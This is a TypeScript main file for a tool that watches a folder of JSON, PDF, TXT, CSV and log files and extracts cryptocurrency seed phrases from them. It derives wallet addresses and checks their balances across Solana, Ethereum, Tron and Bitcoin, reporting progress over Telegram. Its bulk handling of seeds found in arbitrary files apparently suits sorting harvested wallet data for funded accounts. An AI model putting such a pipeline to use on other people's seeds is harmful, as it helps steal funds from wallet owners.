import fs from "fs";
import path from "path";
import chokidar from "chokidar";
import * as pdfParseModule from "pdf-parse";
import { deriveFromMnemonic } from "./derive.js";
import { getNextBatch } from "./db.js";
import { checkSolanaBatch } from "./checkers/solana.js";
import { checkEthereumBatch } from "./checkers/ethereum.js";
import { checkTronBatch } from "./checkers/tron.js";
import { checkBitcoinBatch } from "./checkers/bitcoin.js";
import { config } from "./config.js";
import { sleep } from "./utils/rateLimiter.js";
import { sendTelegram } from "./notify.js";
import { extractSeedPhrases } from "./utils/seedExtractor.js";
import { log } from "./utils/logger.js";

const pdfParse = (pdfParseModule as any).default || pdfParseModule;

const INCOMING = path.join(process.cwd(), "incoming");
const PROCESSED = path.join(process.cwd(), "processed");

if (!fs.existsSync(INCOMING)) fs.mkdirSync(INCOMING, { recursive: true });
if (!fs.existsSync(PROCESSED)) fs.mkdirSync(PROCESSED, { recursive: true });

log("Multi-chain balance checker started");
log("Drop JSON / PDF / TXT / CSV files into the /incoming folder");

async function processSeedFile(filePath: string) {
  log(`Processing file: ${filePath}`);

  try {
    const ext = path.extname(filePath).toLowerCase();
    let textContent = "";

    if (ext === ".json") {
      const raw = fs.readFileSync(filePath, "utf8");
      try {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed)) {
          textContent = parsed.join("\n");
        } else if (parsed.seeds && Array.isArray(parsed.seeds)) {
          textContent = parsed.seeds.join("\n");
        } else {
          textContent = raw;
        }
      } catch {
        textContent = raw;
      }
    } else if (ext === ".pdf") {
      const dataBuffer = fs.readFileSync(filePath);
      const pdfData = await pdfParse(dataBuffer);
      textContent = pdfData?.text || "";
    } else {
      textContent = fs.readFileSync(filePath, "utf8");
    }

    const seeds = extractSeedPhrases(textContent);

    if (seeds.length === 0) {
      log(`No valid seed phrases found in ${path.basename(filePath)}`);
      const dest = path.join(PROCESSED, path.basename(filePath));
      fs.renameSync(filePath, dest);
      return;
    }

    log(`Found ${seeds.length} seed phrase(s). Deriving ALL paths...`);

    let processed = 0;
    for (const mnemonic of seeds) {
      try {
        await deriveFromMnemonic(mnemonic);
        processed++;
        if (processed % 5 === 0 || processed === seeds.length) {
          log(`Derived ${processed}/${seeds.length} seeds`);
        }
      } catch (err) {
        log(`Derive error for one seed: ${err}`);
      }
    }

    log(`Finished deriving ${processed} seeds from ${path.basename(filePath)}`);

    const dest = path.join(PROCESSED, path.basename(filePath));
    fs.renameSync(filePath, dest);

    await sendTelegram(
      `✅ Processed <b>${path.basename(filePath)}</b>\nDerived addresses from <b>${processed}</b> seed(s)`
    );
  } catch (err: any) {
    log(`Failed to process file: ${err.message || err}`);
  }
}

const allowedExtensions = [".json", ".pdf", ".txt", ".csv", ".md", ".log"];

chokidar
  .watch(INCOMING, {
    persistent: true,
    ignoreInitial: false,
    awaitWriteFinish: {
      stabilityThreshold: 2000,
      pollInterval: 100,
    },
  })
  .on("add", async (filePath) => {
    const ext = path.extname(filePath).toLowerCase();
    if (allowedExtensions.includes(ext)) {
      try {
        await processSeedFile(filePath);
      } catch (err) {
        log(`Error while processing file: ${err}`);
      }
    }
  });

async function runCheckerCycle() {
  const chains = [
    { name: "solana", fn: checkSolanaBatch },
    { name: "ethereum", fn: checkEthereumBatch },
    { name: "tron", fn: checkTronBatch },
    { name: "bitcoin-legacy", fn: checkBitcoinBatch },
    { name: "bitcoin-nested", fn: checkBitcoinBatch },
    { name: "bitcoin-segwit", fn: checkBitcoinBatch },
    { name: "bitcoin-taproot", fn: checkBitcoinBatch },
  ];

  log("=== Starting parallel chain workers ===");

  await Promise.all(
    chains.map(async (chain) => {
      log(`[${chain.name}] worker started`);

      while (true) {
        const batch = getNextBatch(chain.name, 40);

        if (batch.length === 0) {
          log(`[${chain.name}] no more addresses in this cycle`);
          break;
        }

        log(`[${chain.name}] processing ${batch.length} addresses`);

        try {
          await chain.fn(batch);
        } catch (err) {
          log(`[${chain.name}] error: ${err}`);
          await sleep(config.sleepAfterErrorMs);
        }

        await sleep(config.sleepBetweenBatchesMs);
      }

      log(`[${chain.name}] worker finished this cycle`);
    })
  );
}

async function main() {
  try {
    await sendTelegram("🚀 Multi-chain balance checker started");
  } catch {
    log("Telegram notification failed (continuing anyway)");
  }

  while (true) {
    try {
      log("----- Starting full cycle -----");
      await runCheckerCycle();
      log("Full cycle finished. Sleeping before next cycle...");
      await sleep(config.sleepAfterFullCycleMs);
    } catch (err: any) {
      log(`Main loop error: ${err}`);
      await sleep(config.sleepAfterErrorMs);
    }
  }
}

main().catch((err) => {
  log(`Fatal error in main: ${err}`);
  process.exit(1);
});